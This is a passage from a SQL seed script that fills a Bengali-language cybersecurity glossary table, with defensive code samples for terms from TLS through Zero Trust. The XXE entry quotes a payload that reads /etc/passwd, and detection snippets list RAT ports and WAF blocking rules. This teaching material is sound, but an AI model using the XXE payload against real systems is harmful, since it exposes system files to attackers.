  (letter, term, short, analogy, definition, use_case, example, code, tags, risk, category, image)
VALUES (
  'T', 'TLS/SSL', 'নিরাপদ ইন্টারনেট যোগাযোগ প্রোটোকল',
  '🔒 ব্যাংক থেকে টাকা নিয়ে আসার সময় আর্মড গার্ড।',
  'TLS (Transport Layer Security) হলো network communication encrypt করার protocol। HTTPS = HTTP + TLS।',
  'ওয়েব, email (STARTTLS), VPN, API communication।',
  'TLS 1.3 (2018) — সবচেয়ে নিরাপদ, faster handshake।',
  $X047X$# Nginx TLS Configuration
server {
    listen 443 ssl http2;
    ssl_certificate     /etc/ssl/cert.pem;
    ssl_certificate_key /etc/ssl/key.pem;

    # Only TLS 1.2 and 1.3
    ssl_protocols TLSv1.2 TLSv1.3;

    # Strong ciphers
    ssl_ciphers 'ECDHE-ECDSA-AES128-GCM-SHA256:ECDHE-RSA-AES128-GCM-SHA256';
    ssl_prefer_server_ciphers off;

    # HSTS (1 year)
    add_header Strict-Transport-Security 'max-age=31536000; includeSubDomains; preload';

    # OCSP Stapling
    ssl_stapling on;
    ssl_stapling_verify on;
}
# Test: ssllabs.com/ssltest/ (aim for A+)$X047X$,
  ARRAY['HTTPS','certificate','handshake','cipher','TLS-1.3'],
  'medium', 'Cryptography', 'https://images.unsplash.com/photo-1614064641938-3bbee52942c7?w=600&q=80'
) ON CONFLICT (term) DO NOTHING;
INSERT INTO public.cyber_terms
  (letter, term, short, analogy, definition, use_case, example, code, tags, risk, category, image)
VALUES (
  'T', 'Threat Modeling', 'সম্ভাব্য হুমকি চিহ্নিত করা',
  '🗺️ যুদ্ধের আগে শত্রুর সব সম্ভাব্য পথ চিহ্নিত করে প্রস্তুতি।',
  'Threat Modeling হলো system-এর security threats systematically চিহ্নিত করার প্রক্রিয়া। STRIDE framework জনপ্রিয়।',
  'Design phase security, product architecture review।',
  'Microsoft SDL-এ সব product-এর threat model mandatory।',
  $X048X$# STRIDE Threat Model
# Spoofing, Tampering, Repudiation,
# Information Disclosure, DoS, Elevation of Privilege

stride = {
    'Spoofing':     'Use Authentication',
    'Tampering':    'Integrity checks, signing',
    'Repudiation':  'Audit logging',
    'Info Disclose':'Encryption, ACL',
    'DoS':          'Rate limiting, redundancy',
    'Elevation':    'Least privilege, sandbox'
}

def analyze(component):
    return [
        {'threat': k, 'mitigation': v, 'risk': 'High'}
        for k, v in stride.items()
    ]

print(analyze('Login API'))$X048X$,
  ARRAY['STRIDE','PASTA','DREAD','design','architecture'],
  'medium', 'Defense', 'https://images.unsplash.com/photo-1563986768609-322da13575f3?w=600&q=80'
) ON CONFLICT (term) DO NOTHING;
INSERT INTO public.cyber_terms
  (letter, term, short, analogy, definition, use_case, example, code, tags, risk, category, image)
VALUES (
  'T', 'Trojan Horse', 'বৈধ সফটওয়্যারের ভেতরে লুকানো ম্যালওয়্যার',
  '🐴 ট্রয়ের কাঠের ঘোড়া — বাইরে উপহার, ভেতরে শত্রু সৈন্য।',
  'Trojan হলো legitimate software-এর ছদ্মবেশে malware। RAT (Remote Access Trojan) attacker-কে full remote control দেয়।',
  'Credential theft, backdoor, keylogging, cryptomining।',
  'Fake Zoom installer — install করতেই RAT install হয়।',
  $X049X$# Trojan Detection
import psutil

def detect_rat():
    suspicious = []
    rat_ports = {4444, 1337, 31337, 8888, 9999}
    for proc in psutil.process_iter(['pid','name','connections']):
        try:
            for conn in (proc.info['connections'] or []):
                if (conn.status == 'ESTABLISHED' and
                        conn.raddr and conn.raddr.port in rat_ports):
                    suspicious.append({
                        'process': proc.info['name'],
                        'pid': proc.info['pid'],
                        'remote': f'{conn.raddr.ip}:{conn.raddr.port}'
                    })
        except: pass
    return suspicious

for item in detect_rat():
    print(f'RAT detected: {item}')$X049X$,
  ARRAY['RAT','backdoor','malware','remote-access','persistence'],
  'critical', 'Malware', 'https://images.unsplash.com/photo-1526374965328-7f61d4dc18c5?w=600&q=80'
) ON CONFLICT (term) DO NOTHING;
INSERT INTO public.cyber_terms
  (letter, term, short, analogy, definition, use_case, example, code, tags, risk, category, image)
VALUES (
  'T', 'Typosquatting', 'ভুল টাইপিংয়ের সুযোগ নেওয়া',
  '🏪 MacDonlds রেস্টুরেন্ট খুলে McDonalds-এর গ্রাহক ধরা।',
  'Typosquatting হলো popular domain বা package-এর typo version register করা। goggle.com, faceboook.com।',
  'Phishing, malware distribution, credential harvesting।',
  'npm incident: malicious package with typo of popular library।',
  $X050X$# Typosquatting Detection
import re

def generate_typos(domain):
    name, tld = domain.rsplit('.', 1)
    typos = set()
    # Double letter
    for i in range(len(name)):
        typos.add(f'{name[:i]}{name[i]*2}{name[i+1:]}.{tld}')
    # Missing letter
    for i in range(len(name)):
        typos.add(f'{name[:i]}{name[i+1:]}.{tld}')
    # Common substitutions
    for c, s in [('o','0'),('l','1'),('i','1')]:
        typos.add(f'{name.replace(c,s)}.{tld}')
    return typos

for t in list(generate_typos('google.com'))[:5]:
    print(t)$X050X$,
  ARRAY['phishing','domain','npm','homograph','brand-protection'],
  'high', 'Social Engineering', 'https://images.unsplash.com/photo-1563986768609-322da13575f3?w=600&q=80'
) ON CONFLICT (term) DO NOTHING;
INSERT INTO public.cyber_terms
  (letter, term, short, analogy, definition, use_case, example, code, tags, risk, category, image)
VALUES (
  'U', 'USB Drop Attack', 'ক্ষতিকর USB ফেলে রাখার আক্রমণ',
  '💾 রাস্তায় পড়ে থাকা মানিব্যাগ কুড়ানো — কৌতূহলে বিপদ।',
  'USB Drop Attack হলো ইচ্ছাকৃতভাবে malicious USB drive ফেলে রাখা — কেউ কুড়িয়ে PC-তে দিলেই malware চলে।',
  'Corporate espionage, air-gapped network compromise।',
  'Pentagon 2008 — infected USB থেকে Russian hackers classified network access পেয়েছিল।',
  $X051X$# USB Security (Linux - USBGuard)
sudo apt install usbguard

# List connected devices
usbguard list-devices

# Allow specific device
usbguard allow-device <ID>

# Block all unknown USB
usbguard generate-policy > /etc/usbguard/rules.conf
systemctl enable --now usbguard

# Windows Group Policy
# Block Removable Storage:
# gpedit.msc > Computer Config
# > Admin Templates > System
# > Removable Storage Access
# > All Removable Storage: Deny all

# 2016 study: 98% people plug in unknown USB!$X051X$,
  ARRAY['physical-security','social-engineering','BadUSB','air-gap','endpoint'],
  'high', 'Social Engineering', 'https://images.unsplash.com/photo-1563986768609-322da13575f3?w=600&q=80'
) ON CONFLICT (term) DO NOTHING;
INSERT INTO public.cyber_terms
  (letter, term, short, analogy, definition, use_case, example, code, tags, risk, category, image)
VALUES (
  'V', 'Virus', 'স্ব-প্রতিলিপিকারী ক্ষতিকর প্রোগ্রাম',
  '🦠 জৈবিক ভাইরাস — host ছাড়া ছড়াতে পারে না, কিন্তু host-এর সাহায্যে ছড়ায়।',
  'Computer Virus হলো self-replicating code যা legitimate files-এ attach করে ছড়ায়। Worm-এর মতো নয় — host file দরকার।',
  'File corruption, data theft, system damage।',
  'ILOVEYOU virus (2000) — email attachment থেকে $10B+ ক্ষতি।',
  $X052X$# Virus Scanner (Python)
import hashlib, os

BAD_HASHES = {
    '44d88612fea8a8f36de82e1278abb02f': 'EICAR Test',
}

def scan_file(path):
    try:
        with open(path, 'rb') as f:
            h = hashlib.md5(f.read()).hexdigest()
        if h in BAD_HASHES:
            print(f'VIRUS: {BAD_HASHES[h]} in {path}')
            return True
    except: pass
    return False

def scan_dir(directory):
    for root, _, files in os.walk(directory):
        for fname in files:
            scan_file(os.path.join(root, fname))

scan_dir('/tmp')$X052X$,
  ARRAY['self-replicating','file-infector','EICAR','malware','boot-sector'],
  'critical', 'Malware', 'https://images.unsplash.com/photo-1526374965328-7f61d4dc18c5?w=600&q=80'
) ON CONFLICT (term) DO NOTHING;
INSERT INTO public.cyber_terms
  (letter, term, short, analogy, definition, use_case, example, code, tags, risk, category, image)
VALUES (
  'V', 'Vulnerability Assessment', 'নিরাপত্তা দুর্বলতা মূল্যায়ন',
  '🏥 বার্ষিক স্বাস্থ্য পরীক্ষা — সমস্যা ধরা পড়লে চিকিৎসা করা যাবে।',
  'Vulnerability Assessment হলো system-এর security weaknesses চিহ্নিত ও classify করার প্রক্রিয়া — Pentest থেকে আলাদা, exploit করা হয় না।',
  'Compliance, risk management, security baseline।',
  'Nessus বা OpenVAS দিয়ে quarterly vulnerability scan।',
  $X053X$# OpenVAS Scan
# Install
sudo apt install openvas
sudo gvm-setup
sudo gvm-start

# Nessus (GUI-based)
# Download from tenable.com
# Create scan target
# Run Full Scan
# Export report as PDF

# Quick online check
# shodan.io — check if your IP is exposed
# hackertarget.com/vulnerability-scanner
# pentest-tools.com

# Prioritize by CVSS score:
# 9.0-10.0 = Critical (fix immediately)
# 7.0-8.9  = High (fix this week)
# 4.0-6.9  = Medium (fix this month)$X053X$,
  ARRAY['Nessus','OpenVAS','CVSS','scanning','risk'],
  'medium', 'Security Testing', 'https://images.unsplash.com/photo-1563986768609-322da13575f3?w=600&q=80'
) ON CONFLICT (term) DO NOTHING;
INSERT INTO public.cyber_terms
  (letter, term, short, analogy, definition, use_case, example, code, tags, risk, category, image)
VALUES (
  'W', 'WAF (Web Application Firewall)', 'ওয়েব অ্যাপ্লিকেশন নিরাপত্তা ফিল্টার',
  '🛡️ স্মার্ট দারোয়ান — সব আগন্তুকের পরিচয় যাচাই করে।',
  'WAF হলো HTTP/HTTPS traffic monitor করার specialized firewall। OWASP rules দিয়ে SQLi, XSS, DDoS ব্লক করে।',
  'E-commerce, API protection, PCI-DSS compliance।',
  'Cloudflare WAF প্রতিদিন 70 billion+ threat ব্লক করে।',
  $X054X$# ModSecurity WAF (Nginx)
# Install
sudo apt install libnginx-mod-security2

# /etc/nginx/modsecurity/modsecurity.conf
# SecRuleEngine On

# OWASP CRS rules
# Block SQL Injection
# SecRule ARGS "@detectSQLi" \
#   "id:942100,phase:2,deny,status:403"

# Block XSS
# SecRule ARGS "@detectXSS" \
#   "id:941100,phase:2,deny,status:403"

# Cloudflare WAF (easiest)
# 1. Change nameservers to Cloudflare
# 2. Enable WAF in Security tab
# 3. Set OWASP ruleset to Block mode$X054X$,
  ARRAY['Cloudflare','ModSecurity','OWASP-CRS','rate-limiting','bot-protection'],
  'medium', 'Defense', 'https://images.unsplash.com/photo-1558494949-ef010cbdcc31?w=600&q=80'
) ON CONFLICT (term) DO NOTHING;
INSERT INTO public.cyber_terms
  (letter, term, short, analogy, definition, use_case, example, code, tags, risk, category, image)
VALUES (
  'W', 'Watering Hole Attack', 'লক্ষ্যবস্তুর পরিচিত সাইটে ফাঁদ',
  '🦁 সিংহ জলের কূপের কাছে অপেক্ষা করে — শিকার নিজেই আসে।',
  'Watering Hole Attack হলো target group-এর নিয়মিত ভিজিট করা ওয়েবসাইট compromise করা।',
  'Specific industry, government, organization targeted attack।',
  '2013 — Apple, Facebook কর্মীরা infected iOS developer site থেকে malware পেয়েছিল।',
  $X055X$# Watering Hole Defense

# Browser Security
# 1. Remote Browser Isolation (RBI)
# 2. NoScript extension
# 3. Keep browser updated

# Network Defense
# DNS Filtering (Cisco Umbrella, Cloudflare Gateway)
# Secure Web Gateway (Zscaler, Palo Alto Prisma)

# Endpoint
# EDR solution (CrowdStrike, SentinelOne)
# Application whitelisting

# Suricata Detection Rule
# alert http $HOME_NET any -> $EXTERNAL_NET any (
#   msg:"Possible Watering Hole";
#   content:".exe"; http_uri;
#   sid:3000001;
# )$X055X$,
  ARRAY['targeted','drive-by','browser','APT','industry'],
  'critical', 'Attack Vector', 'https://images.unsplash.com/photo-1526374965328-7f61d4dc18c5?w=600&q=80'
) ON CONFLICT (term) DO NOTHING;
INSERT INTO public.cyber_terms
  (letter, term, short, analogy, definition, use_case, example, code, tags, risk, category, image)
VALUES (
  'W', 'Worm', 'স্বয়ংক্রিয়ভাবে ছড়ানো ম্যালওয়্যার',
  '🐛 জৈবিক কৃমি — নিজে নিজেই ছড়ায়, কারো সাহায্য লাগে না।',
  'Worm হলো self-replicating malware যা নেটওয়ার্কে automatically ছড়িয়ে পড়ে — host program ছাড়াই।',
  'Network bandwidth abuse, backdoor install, DDoS।',
  'Stuxnet — USB থেকে শুরু করে Siemens SCADA network infected।',
  $X056X$# Worm Defense

# Network monitoring
netstat -an | grep ESTABLISHED | \
  awk '{print $5}' | cut -d: -f1 | \
  sort | uniq -c | sort -rn | head -20

# Unusual connection count = worm indicator

# Honeypot with Cowrie
docker run -p 2222:2222 cowrie/cowrie

# Prevention:
# Patch immediately (worms exploit known CVEs)
# Network segmentation (limit spread)
# Disable unnecessary services
# IDS/IPS detection rules$X056X$,
  ARRAY['self-replicating','Stuxnet','network','patch','propagation'],
  'critical', 'Malware', 'https://images.unsplash.com/photo-1526374965328-7f61d4dc18c5?w=600&q=80'
) ON CONFLICT (term) DO NOTHING;
INSERT INTO public.cyber_terms
  (letter, term, short, analogy, definition, use_case, example, code, tags, risk, category, image)
VALUES (
  'X', 'XXE (XML External Entity)', 'XML-এর মাধ্যমে ফাইল পড়া',
  '📄 ডকুমেন্টের ভেতরে লুকানো নির্দেশনা — পড়তে গিয়ে গোপন তথ্য দেওয়া।',
  'XXE হলো OWASP vulnerability যেখানে malicious XML-এ external entity দিয়ে server-এর internal files পড়া বা SSRF করা যায়।',
  'XML parser, file upload, SOAP web services।',
  'POST /api — XML body-তে ENTITY xxe SYSTEM file:///etc/passwd',
  $X057X$// XXE Prevention (Node.js)
const libxml = require('libxmljs2');

function safeParseXML(xml) {
    // Disable external entities
    return libxml.parseXmlString(xml, {
        nonet: true,    // no network access
        noent: false,   // no entity expansion
        dtdload: false, // no DTD loading
    });
}

// Best practices:
// 1. Use JSON instead of XML when possible
// 2. Validate XML schema before parsing
// 3. Use updated XML libraries
// 4. Disable DOCTYPE declarations
// <?xml version='1.0'?>
// <!DOCTYPE foo [<!ENTITY xxe SYSTEM 'file:///etc/passwd'>]>$X057X$,
  ARRAY['XML','OWASP','entity','SSRF','parser'],
  'high', 'Web Security', 'https://images.unsplash.com/photo-1555949963-aa79dcee981c?w=600&q=80'
) ON CONFLICT (term) DO NOTHING;
INSERT INTO public.cyber_terms
  (letter, term, short, analogy, definition, use_case, example, code, tags, risk, category, image)
VALUES (
  'Z', 'Zero Trust Architecture', 'কাউকে বিশ্বাস না করার নিরাপত্তা মডেল',
  '🏰 প্রতিটি দরজায় গার্ড — ভেতরে থাকলেও পরিচয় দিতে হবে।',
  'Zero Trust হলো Never Trust, Always Verify নীতি। Network location নির্বিশেষে প্রতিটি access request verify করা।',
  'Remote work, cloud environment, high-security enterprise।',
  'Google BeyondCorp — 2010 সাল থেকে Zero Trust model।',
  $X058X$// Zero Trust Middleware (Node.js)
const zeroTrust = async (req, res, next) => {
    // 1. Identity verify
    const user = await verifyJWT(req.headers.authorization);
    if (!user) return res.status(401).json({ error: 'Identity not verified' });

    // 2. Device health
    const device = await checkDevice(req.headers['x-device-id']);
    if (!device.compliant)
        return res.status(403).json({ error: 'Device not compliant' });

    // 3. Context (location, time, behavior)
    const risk = await analyzeContext(req.ip, req.user);
    if (risk.score > 0.7)
        return res.status(403).json({ error: 'High risk context' });

    // 4. Least privilege check
    const allowed = await checkPermission(user.id, req.path);
    if (!allowed) return res.status(403).json({ error: 'Access denied' });

    req.user = user;
    next();
};$X058X$,
  ARRAY['BeyondCorp','micro-segmentation','SASE','ZTNA','least-privilege'],
  'medium', 'Defense', 'https://images.unsplash.com/photo-1558494949-ef010cbdcc31?w=600&q=80'
) ON CONFLICT (term) DO NOTHING;

-- Verify
SELECT COUNT(*) as total FROM public.cyber_terms;